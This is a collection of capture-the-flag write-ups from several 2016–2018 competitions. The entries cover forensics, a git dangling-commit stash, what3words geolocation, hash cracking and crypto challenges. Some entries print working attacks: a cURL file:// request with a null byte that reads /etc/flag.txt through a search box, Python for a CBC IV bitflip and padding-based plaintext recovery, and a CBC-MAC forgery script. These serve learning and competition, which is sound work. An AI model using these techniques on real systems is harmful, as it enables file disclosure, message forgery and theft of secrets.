[engine.io message] b'2["getMyLovelyFlag","Flag{S9ck3t_I0_set_by_Th3_EMPIRE_NIAHAHAHAHAHAHA_xD}"]'
[socket.io packet received] b'2["getMyLovelyFlag","Flag{S9ck3t_I0_set_by_Th3_EMPIRE_NIAHAHAHAHAHAHA_xD}"]'
[socket.io event] getMyLovelyFlag('Flag{S9ck3t_I0_set_by_Th3_EMPIRE_NIAHAHAHAHAHAHA_xD}')
```

Success!



### File: writeups/securinets-2018/easy.md

Easy
-----
> Can't be easier
> 
> Link : http://rev.ctfsecurinets.com/1/easy

Download the file, open it in your favorite text editor, search for 'Flag', and find `Flag{This_Is_A_Hidden_Flag!!}`.



### File: writeups/sunshinectf-2018/Old-Favorites.md

# Old Favorites

>We were sent this file with the description '9/10 people could find the hidden flag, are you one of them?'.
>
>Author: hackucf_loavso
>
>OldFavorites.mp4

Okidoki, a forensics challenge with a video. Let's try to open it and see what we've got.

![screenshot](https://github.com/DancingSimpletons/writeups/blob/master/sunshinectf-2018/OldFavorites.gif)

DAMN IT, they got me.

Might as well watch the video to see if there's anything obvious. Around 2:20 into the video, there are some noticeable audio distortions.

To extract the audio from the mp4, we can run the following: `ffmpeg -i OldFavorites.mp4 OldFavorites.wav`

We need it as a *wav* file so we can open it with Sonic Visualiser and/or Audacity and check what's going on. So let's open it up and see what we can see around 2:20 in the audio. With these kind of challenges there's often something in the spectrogram, so we will first view that.

![spectrogram](https://github.com/DancingSimpletons/writeups/blob/master/sunshinectf-2018/spectrogram.PNG)

Well, there it is `sun{you_know_the_rules}`



### File: writeups/sunshinectf-2018/my-secret-stash.md

# My Secret Stash
>Do you like secrets? I like secrets! In fact, I LOVE SECRETS! But there's no way I'll ever share my secrets with you! Not in a million years! I don't share secrets with anyone! Okay, I might share one secret with you, but I've stashed it away somewhere you'll never think to find it!If you can dig up my secert stash I'll let you have it! How about that huh? Does that sound like a fun game?
>
>See if you can dig up my secret stash!hahahahahahahahahahahaha!!!!!!!!!!!!!!!!!!!!!!!!!!!!
>
>Author: hackucf_charlos
>
> file: secret-stuff.tar.gz

The archive contains the following structure:                                   
``` terminal
$ tree -a -L 1 my-secret-stash-repo/
my-secret-stash-repo/
├── .git
└── secrets
```

Ok so it has a git repository, let's look at the log:
``` terminal
$ git log
commit 14a5c7088e7638abb2232c8cac1c7dd4687819f0
Merge: 7e29273 7b82ac0
Author: Carlos Staszeski <cstaszeski@gmail.com>
Date:   Thu Mar 15 20:31:39 2018 -0400

    WIP on master: 7e29273 vegan!

commit 7b82ac03c49c0b55a4a8b8ffb3c04c5fe565fba6
Author: Carlos Staszeski <cstaszeski@gmail.com>
Date:   Thu Mar 15 20:31:39 2018 -0400

    index on master: 7e29273 vegan!

commit 7e2927361b7e4101e07fc5a475bb244622a275e3
Author: Carlos Staszeski <cstaszeski@gmail.com>
Date:   Thu Mar 15 20:29:53 2018 -0400

    vegan!
```

So there are some commits
``` terminal
$ cat secrets
I'm so very sorry, you will not find my secrets in here. There was a time at which I wanted to share my secrets with someone, but that was long ago and I don't trust anyone anymore. I want to keep all of my secrets to myself for now on! Good luck trying to find them, there's nothing to find. hehehehehehehehe!!!!!!

$ git checkout 92fb7e7ebbc65d04ac311c3f1d4e496cd867e94d

$ cat secrets
I feel like we are becoming good friends you and I. Yes. I even considered letting you in on one of my secrets just now, but I didn't want to risk it falling into the wrong hands. So instead I stashed it away and destroyed it so that no one would ever be able to recover my secrets! muahahahahahah!!!!!!

$ git checkout 7e2927361b7e4101e07fc5a475bb244622a275e3

$ cat secrets
So, you've discovered how to travel back in time did you? Well that's not going to help you much here, you see, my stash is so well hidden you will never ever ever find it! hahahahahahahahhahahahahahahahahahahah!!!!!!!!!!!!!
```

Ok, so the flag is hidden somewhere else in the repository. After looking for branches (there were none) and some other places, I ran `git fsck`.

``` terminal
$ git fsck
Checking object directories: 100% (256/256), done.
dangling commit 14a5c7088e7638abb2232c8cac1c7dd4687819f0

$ git checkout 14a5c7088e7638abb2232c8cac1c7dd4687819f0

$ cat secrets
sun{git_gud_k1d}
```

Alright, there we have `sun{git_gud_k1d}`. The flag was hidden in a dangling commit! 


### File: writeups/sunshinectf-2018/search-box.md

Search Box
----------

> This search engine doesn't look very secure.
>
> Or well coded.
>
> Or competent in any way shape or form.
>
> This should be easy.

>Note: flag is in /etc/flag.txt

>http://search-box.web1.sunshinectf.org

:information_source: _The challenge is no longer online, so this writeup was written from memory_

Let's open the URL and prod around. We find a search box, which can retrieve the source code of any page on https://www.google.com.

1. Different hostnames are all blocked. Examples are:
  * `evil.com` 
  * hostnames that include `www.google.com` such as `www.google.com.evil.com` 
  * URLs that include google.com such as `www.evil.com/http://www.google.com`

2. [php:// filter urls](https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/) do not work.

3. Appending a null byte to the query, i.e., `site=http%3A%2F%2Fwww.google.com%00` gives a warning: `curl_setopt(): Curl option contains invalid characters (\0)`
  * So null bytes are detected and blocked
  * We now know that the backend used is cURL
  
4. Googling for this error then leads to https://bugs.php.net/bug.php?id=68089
  * This has a nice example: `file:///etc/passwd%00http://google.com`
  * Apparently cURL also understands `file://` urls!
  * If you read carefully, you'll notice that this specific vulnerability is not addressed in PHP as it's considered a cURL issue
  
5. First focusing on the `file://` protocol: we notice that this protocol is supported, as `file://www.google.com` returns a _different_ error than before.

6. Testing locally, we find that `file://www.google.com/../etc/passwd` in fact reads `/etc/passwd`. However, search-box appends a `/`
   to the end of the url, which means the code would try to read `/etc/passwd/`, which of course doesn't exist.
   
7. Combining the two, we can send the null byte URLencoded to cURL. So the final attack URL becomes something like
   `file://www.google.com/../etc/flag.txt%00`. The final request thus becomes
   http://search-box.web1.sunshinectf.org/?submit=Submit&site=file%3A%2F%2Fwww.google.com%2F..%2Fetc%2Fflag.txt%2500
   and this finally gets us the flag.



### File: writeups/swampctf-2018/Etherealboy.md

# Etherealboy

>A new wizard has arrived in your town and with him he brings a strange technology. He has started handing out these tiny boxes with moving pictures on them. Apparently anyone who can find his secret message will be rewarded greatly. Do you have the skills to break the code of this new device?
>
>-=Created By: matg=-

The challenge supplies us with a file named `game.gb, which seems like it will be a GameBoy rom. This challenge falls in the Forensics category, so hopefully it will be a bit light on reversing.

First, let's see what happens if we just open the rom in an emulator. I downloaded the emulator called [bgb](http://bgb.bircd.org/) to run the rom, since this also includes a debugger that might come in handy.

The game starts and shows us the below screen. Our character is in the middle and we're able to walk around and interact with the npc at the top.

![game screen](https://raw.githubusercontent.com/DancingSimpletons/writeups/master/swampctf-2018/game-screenshot.bmp)

If we interact with the npc we get some hex value in the middle of the screen and every interaction just gives a new one. An example is in the image below.

![hex value in screen](https://raw.githubusercontent.com/DancingSimpletons/writeups/master/swampctf-2018/game-screenshot2.bmp)

The characters don't really give me much information, so I decide to take a look around the different features of the debugger in the emulator. Maybe I can find some strings in memory, or maybe there is something that will help me further.

I get memory and assembly dumps through the emulator and search them for something like 'flag' or 'flag{' but i get no usable result. Time to look at some other things.

Since the challenge is forensics, I just keep looking if there's something in the resources of this rom. So let's open up the VRAM viewer of bgb. It has 4 tabs: 
* BG map
* Tiles
* OAM
* Palettes

`BG map` shows, as the name suggests, the background we see in the screenshots. Nothing much besides that. Next tab is `Tiles`.
![tiles](https://raw.githubusercontent.com/DancingSimpletons/writeups/master/swampctf-2018/bgb-debugger-tiles.jpg)

Ok, well that wasn't what I expected...
So there's our flag `flag{und3r_th3_hood}`


### File: writeups/swampctf-2018/locked-dungeon-2.md

# Locked Dungeon 2
> The Dungeon Keeper learned from its mistake. This next lock is protected by even stronger encryption. We're so close to the final level...there has to be a way in.
>
> Connect: nc chal1.swampctf.com 1460

https://play.swampctf.com/files/ece0eeee169fe4fd3070f1b2f146c973/enter_the_dungeon2.py

This is a two-step challenge:

First, we have to create a modified encrypted output that, when decrypted, contains "get_modflag_md5": 
```python
enc_recv_str = raw_input()
dec_recv_str = aescipher.decrypt_wrapper(enc_recv_str)
if "get_modflag_md5" in dec_recv_str:
    # success
```

Once we are through this stage, we have to extract the flag, by submitting up to 500 encrypted values, and getting the md5 hash of the decrypted value back:
```python
enc_recv_str = raw_input()
dec_recv_str = aescipher.decrypt_wrapper(enc_recv_str)
sys.stdout.write(b64encode(md5(dec_recv_str).digest()))
```

First things first: this challenge uses AES in CBC mode, with a random key and IV for each connection. However, no MAC is being used,
so there is no authenticity provided. This means that, although we cannot directly decrypt the data, we can modify the contents.

This is a good moment to read up on [Block cipher modes](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation),
and specifically, understanding the following two images:

![CBC encryption](https://upload.wikimedia.org/wikipedia/commons/thumb/8/80/CBC_encryption.svg/601px-CBC_encryption.svg.png)
![CBC decryption](https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/CBC_decryption.svg/601px-CBC_decryption.svg.png)

For the first part of the challenge, we need to insert `get_modflag_md5` into the decrypted data. To do so, we use the knowledge that
`send_modflag_enc` will be part of the decrypted data. To simplify things, we will assume the decrypted data will have the form 
`send_modflag_encflag{.....}`. The same method can be extended to situations where `send_modflag_enc` is in another block.

First, note that we are using AES, which means a 16-byte block size. `send_modflag_enc` is _exactly_ 16 bytes. Now, let's take a look
at how CBC decryption works. We know the decrypted contents of the first block is `send_modflag_enc`, we know the encrypted first block
and we know the IV. Decryption of the first block works as follows: `decrypted_block = AES_Decrypt_block(encrypted_block) ⊕ IV`, i.e.,
`'send_modflag_enc' = AES_Decrypt_block(encrypted_block) ⊕ IV`. However, we can also _modify_ the IV, which means we can directly control
the decrypted block. If we choose `newIV = oldIV ⊕ 'send_modflag_enc' ⊕ 'get_modflag_md5 '`, then we find that

```
decrypted_block = AES_Decrypt_block(encrypted_block) ⊕ newIV
                = AES_Decrypt_block(encrypted_block) ⊕ oldIV ⊕ 'send_modflag_enc' ⊕ 'get_modflag_md5 '
                = 'send_modflag_enc' ⊕ 'send_modflag_enc' ⊕ 'get_modflag_md5 '
                = 'get_modflag_md5 '
```

In Python code, using [conn.py](https://github.com/DancingSimpletons/writeups/blob/master/swampctf-2018/conn.py):
```python
import time
import numpy as np
from conn import Conn

conn = Conn(port=1460)
time.sleep(0.2)

encdata = base64.b64decode(conn.read())
conn.read()

newIV = np.frombuffer(encdata[:16], dtype=np.uint8) ^ \
        np.frombuffer(b'send_modflag_enc', dtype=np.uint8) ^ \
        np.frombuffer(b'get_modflag_md5 ', dtype=np.uint8) 

newencdata = newIV.tobytes() + encdata[16:]

result = conn.send(base64.b64encode(newencdata))

if b'Dungeon goes deeper' not in result:
    raise Exception('try again!')
```

After we get `Dungeon goes deeper..` as result, we can continue with the second part of the challenge: extracting the flag. For this,
we first take a more detailed look at the decryption method:

```python
def decrypt_wrapper(self, encoded_enc_str):
    enc_str = b64decode(encoded_enc_str)
    return self.__decrypt(enc_str[16:], enc_str[:16])

def __decrypt(self, enc_str, iv):
    cipher = AES.new(self.key, AES.MODE_CBC, iv)
    decrypted_str = cipher.decrypt(enc_str)
    decrypted_str = unpad(decrypted_str)
    return decrypted_str
    
unpad = lambda inp: inp[:-ord(inp[-1])]
```

Where the `unpad` method looks interesting: this implements a very basic form of [PKCS7 unpadding](https://en.wikipedia.org/wiki/Padding_(cryptography)#PKCS7),
without any validation (e.g. validating that the result is ≤ 16 bytes, that all removed padding bytes contain the same value). Note
that this validation is generally not useful, as the data should have been MACed to begin with.

What this means is that as long as we can change the last byte to be e.g. length-1, we get the md5 hash of the first character of the
plaintext data. We can then easily enumerate the md5 hashes, get the first character, and repeat with all subsequent characters.

The easiest way to do this is to add two blocks to the ciphertext: `aaaaaaaaaaaaaaaX aaaaaaaaaaaaaaa`, where we change `X` to be every
possible byte. This means that the decrypted last byte will be `plain_last_byte = AES_Decrypt(last_block)[-1] ⊕ X`, and because
`AES_Decrypt(last_block)[-1]` is constant, `plain_last_byte` will take every value (although we will not know which value corresponds
to which value of X).

When we do this, we will get a set of values that contains
- md5('')
- md5('s')
- md5('se')
- md5('sen')
- ...etc

First step is retrieving this set from the server:

```python
allmd5hashes = []

for testbyte in range(256):
    newencdata = encdata + \ 
                 b'a' * 15 + bytes([testbyte]) + \
                 b'a' * 16

    result = conn.send(base64.b64encode(newencdata), 0.5).strip()
    allmd5hashes.append(result)
```

and we find that indeed:
```
>>> base64.b64encode(md5(b'').digest()) in allmd5hashes
True
>>> base64.b64encode(md5(b's').digest()) in allmd5hashes
True
>>> base64.b64encode(md5(b'se').digest()) in allmd5hashes
True
>>> base64.b64encode(md5(b'send_modflag_enc').digest()) in allmd5hashes
True
```
Nice!

We can then build the plaintext, one byte at a time:
```python
f = b''

# loop over positions
for i in range(100):
    # loop over character hypotheses
    for char in range(256):
        testflag = f + bytes([char])
        if (base64.b64encode(md5(testflag).digest())) in allmd5hashes:
            print(testflag)
            f = testflag
            break
```

and we get in return:
```
b's'
b'se'
b'sen'
b'send'
b'send_'
b'send_m'
b'send_mo'
b'send_mod'
b'send_modf'
b'send_modfl'
b'send_modfla'
b'send_modflag'
[...]
b'send_modflag_encflag{Ev3n_dunge0ns_are_un5af3_wIth_vu1n_padding}'
```

so the flag is `flag{Ev3n_dunge0ns_are_un5af3_wIth_vu1n_padding}`.



### File: writeups/swampctf-2018/the-vault.md

# The Vault

> Has it been days? Weeks? You can't remember how long you've been standing at the door to the vault.
You can't remember the last time you slept
or ate,
or had a drop of water, for that matter.
But all of that is insignificant, in the presence of the untold fortunes that must lie just beyond the threshold.
>
>But the door. It won't budge. It says it will answer only to the DUNGEON_MASTER.
Have you not shown your worth?
But more than that,
It demands to know your secrets.
>
>Nothing you've tried has worked.
You've pled, begged, cursed, but the door holds steadfast, harshly judging your failed requests.
>
>But with each failed attempt you start to notice more and more
that there's something peculiar about the way the door responds to you.
>
>Maybe the door knows more than it's letting on.
...Or perhaps it's letting on more than it knows?
>
>NOTE: DO NOT USE AUTOMATED TOOLS
Connect
http://chal1.swampctf.com:2694
>
>-=Created By: juan=-

Following the link, we arrive at a page with a Door and username and password fields. The long challenge text gave us the username `DUNGEON_MASTER`, so let's just try to log in with `aaa` as the password and see what our browsers developer tools show :).

We get an alert stating `Invalid credential` and an HTTP 500 response
```
Request URL: http://chal1.swampctf.com:2694/login/DUNGEON_MASTER.aaa
Request Method: POST
Status Code: 500 Internal Server Error
Remote Address: 18.219.151.204:2694
Referrer Policy: no-referrer-when-downgrade
```
The response also contained some html
``` html
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>test_hash [9834876dcfb05cb167a5c24953eba58c4ac89b1adf57f28f2f9d09af107ee8f0] does not match real_hash[40f5d109272941b79fdf078a0e41477227a9b4047ca068fff6566104302169ce]</pre>
</body>
</html>
```
Alright, the length of the hash makes me assume this is SHA256. I try hashing my input to see if the test_hash is something from my input and it is just the SHA256 hash of 'aaa'. 

Maybe this hash is know, so let's look online. Now at the moment I did this I forgot I could use the findmyhash script, so I just went to different websites to check the hash. At crackstation.net I found the plaintext of the real_hash, which is `smaug123`

Trying to log in with the user 'DUNGEON_MASTER' and password ''smaug123' yields us an alert with `flag{somewhere_over_the_rainbow_tables}`


### File: writeups/swampctf-2018/words-of-power.md

# Words of Power

> You push the wooden door. It creaks open to reveal a dust covered study. Cobwebs string across the dilapidated armchair and fine fibers stream down from the ceiling. Grey, dusty tomes line the walls. Nothing stands out...except one book which pulses, gently disturbing the dust around it. You walk over to the book and slide it from its shelf. It feels warm to the touch and tingles in your hand.
>
> You open it to find incomprehensible three word phrases written on every page. None of the words stand out on their own, yet you feel you that together they bring meaning. Decipher the book's contents and be rewarded with a new found understanding of the world around you.
> 
> Hint: the title of the book is Magni Momenti Locat

The attached file contains a series of lines with three words:

```
dunk.curing.leaned
dimly.paths.thickly
wader.tunic.pinches
sizzled.hotdogs.goals
cease.authors.crashed
prattle.bookmark.scorecard
shopper.tripped.seedless
walkway.repaint.song
bony.intestine.bubble
```

One of the many projects to make GPS coordinates more user-friendly is https://what3words.com/. Let's try to see if these locations resolve:

- https://map.what3words.com/dunk.curing.leaned
- https://map.what3words.com/dimly.paths.thickly
- https://map.what3words.com/wader.tunic.pinches

Ok, that seems to work! W3w luckily also has [an API](https://docs.what3words.com/api/v2/), which we can use in Python.
After installing [what3words-python-wrapper](https://github.com/what3words/w3w-python-wrapper), we can simply:

```python
import what3words
import requests

w3w = what3words.Geocoder(API_KEY)

words = [line.strip()
         for line in requests.get(
            "https://play.swampctf.com/files/4fdecbe9383a45cf6e1f29f9c1daac8e/book-pages.txt"
         ).text.strip().split("\n")]

coordinates = []

for word in words:
    coordinates.append(w3w.forward(addr=word)['geometry'])
```

We then plot the coordinates using matplotlib:
```python
from matplotlib import pyplot as plt

lat = [c['lat'] for c in coordinates]
lng = [c['lng'] for c in coordinates]

plt.subplot(aspect='equal')
plt.plot(lng, lat, ".")
```

and find the flag:

![flag](https://github.com/DancingSimpletons/writeups/blob/master/swampctf-2018/words-of-power.png)



### File: writeups/tumctf-2016/haggis.md

Writeup for the [Haggis](https://2016.ctf.link/internal/challenge/2) flag.

The challenge is the following:

  * A message $m$ is padded, then encrypted using AES in CBC mode, with known key $K=0$ and IV $IV=0$, to ciphertext $c$.
  * $m$ needs to _start_ with "I solemnly swear that I am up to no good.\0"
  * $c$ needs to _end_ with 16 bytes that are randomly generated as challenge.

The code given for the challenge is as follows:
``` python
#!/usr/bin/env python3
 import os, binascii, struct
from Crypto.Cipher import AES

pad = lambda m: m + bytes([16 - len(m) % 16] * (16 - len(m) % 16))
def haggis(m):
    crypt0r = AES.new(bytes(0x10), AES.MODE_CBC, bytes(0x10))
    return crypt0r.encrypt(len(m).to_bytes(0x10, 'big') + pad(m))[-0x10:]

target = os.urandom(0x10)
print(binascii.hexlify(target).decode())

msg = binascii.unhexlify(input())

if msg.startswith(b'I solemnly swear that I am up to no good.\0') \
        and haggis(msg) == target:
    print(open('flag.txt', 'r').read().strip()
```

First, let's take a look at how CBC encryption works:
![Image of CBC mode](https://upload.wikimedia.org/wikipedia/commons/thumb/8/80/CBC_encryption.svg/601px-CBC_encryption.svg.png)

For every block of 16 bytes, the plaintext is XOR'ed with the 16-byte
ciphertext of the previous block (or the IV for the first block). The result
of this XOR is then encrypted using AES to form the ciphertext block. We can add
extra data to the plaintext, and we know the ciphertext of the given text, so we
can always fully control the input to AES, and therefore, the output.

How do we now construct our message? We construct the following template for the padded
message (i.e., the input to AES):

```
00000000  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 40  |...............@|
00000010  49 20 73 6f 6c 65 6d 6e  6c 79 20 73 77 65 61 72  |I solemnly swear|
00000020  20 74 68 61 74 20 49 20  61 6d 20 75 70 20 74 6f  | that I am up to|
00000030  20 6e 6f 20 67 6f 6f 64  2e 00 00 00 00 00 00 00  | no good........|
00000040  ?? ?? ?? ?? ?? ?? ?? ??  ?? ?? ?? ?? ?? ?? ?? ??  |????????????????|
00000050  10 10 10 10 10 10 10 10  10 10 10 10 10 10 10 10  |................|
```

Where, from top to bottom, we have the big-endian length of our message (64 bytes),
the required plaintext, padded with NUL bytes, 16 bytes we directly control, and
16 bytes of 0x10 padding.

We now start by running the first 0x40 bytes through AES. This gives us the ciphertext of block 0x30,
which is used as IV for block 0x40.

``` python
binascii.hexlify(
    AES.new(bytes(0x10), AES.MODE_CBC, bytes(0x10)).encrypt(
        '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40'
        'I solemnly swear that I am up to no good.'
        '\x00\x00\x00\x00\x00\x00\x00'
    )[-16:]
)

b'017697c4110fa9b0824994eb7ba4a435'
```

The final two AES steps then are:

 * $c_{0x40}$ = AES($m_{0x30}$ ^ `017697c4110fa9b0824994eb7ba4a435`),
 * $c_{0x50}$ = AES(`10101010101010101010101010101010` ^ $c_{0x40}$)

Where $c_{0x50}$ is our target string. For this example, we take
$c_{0x50}$=`00112233445566778899aabbccddeeff` as target. We now work backwards,
using AES in decryption mode, and use IV=0 so that the XOR step is explicit:

``` python
xor = lambda a,b: bytes(i ^ j for (i,j) in zip(a,b))

target = binascii.unhexlify('00112233445566778899aabbccddeeff')
dec_target = AES.new(bytes(0x10), AES.MODE_CBC, bytes(0x10)).decrypt(target)
# dec_target = 01b01ebc304cbe5467c4d78376f9641d
c40 = xor(dec_target, binascii.unhexlify('10101010101010101010101010101010'))
# c40 = 11a00eac205cae4477d4c79366e9740d
dec_c40 = AES.new(bytes(0x10), AES.MODE_CBC, bytes(0x10)).decrypt(c40)
# dec_c40 = d277edfe984ec000752e51f28bab3eb1
m30 = xor(dec_c40, binascii.unhexlify('017697c4110fa9b0824994eb7ba4a435'))
# m30 = d3017a3a894169b0f767c519f00f9a84
```

So the message becomes:

```
msg = b"I solemnly swear that I am up to no good." + \
      b"\x00"*7 + \
      binascii.unhexlify('d3017a3a894169b0f767c519f00f9a84')
```

and the output from `haggis`:
```
binascii.hexlify(haggis(msg))

b'00112233445566778899aabbccddeeff'
```

Success! Rewriting for a generic input gives us the following script:

``` python
#!/usr/bin/env python3
import os, binascii, struct
from Crypto.Cipher import AES

xor = lambda a,b: bytes(i ^ j for (i,j) in zip(a,b))

target = binascii.unhexlify(input())
dec_target = AES.new(bytes(0x10), AES.MODE_CBC, bytes(0x10)).decrypt(target)
c40 = xor(dec_target, binascii.unhexlify('10101010101010101010101010101010'))
dec_c40 = AES.new(bytes(0x10), AES.MODE_CBC, bytes(0x10)).decrypt(c40)
m30 = xor(dec_c40, binascii.unhexlify('017697c4110fa9b0824994eb7ba4a435'))

msg = b"I solemnly swear that I am up to no good." + b"\x00"*7 + m30
print(binascii.hexlify(msg))
```

